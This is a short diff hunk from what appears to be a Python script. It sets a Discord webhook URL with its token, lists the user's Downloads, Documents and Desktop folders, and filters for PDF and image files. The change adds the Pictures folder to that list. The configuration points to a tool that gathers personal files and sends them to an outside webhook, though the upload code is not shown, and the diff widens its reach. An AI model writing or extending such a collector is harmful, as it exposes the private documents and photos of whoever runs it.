@@ -10,7 +10,8 @@ WEBHOOK_URL = "https://discord.com/api/webhooks/1563676882468343980/VPrL_iVZc8gO
 CARPETAS = {
     "Descargas": Path.home() / "Downloads",
     "Documentos": Path.home() / "Documents",
-    "Escritorio": Path.home() / "Desktop"
+    "Escritorio": Path.home() / "Desktop",
+    "Imagenes": Path.home() / "Pictures"
 }
 
 EXTENSIONES_PERMITIDAS = {'.pdf', '.jpg', '.jpeg', '.png', '.webp', '.gif'}
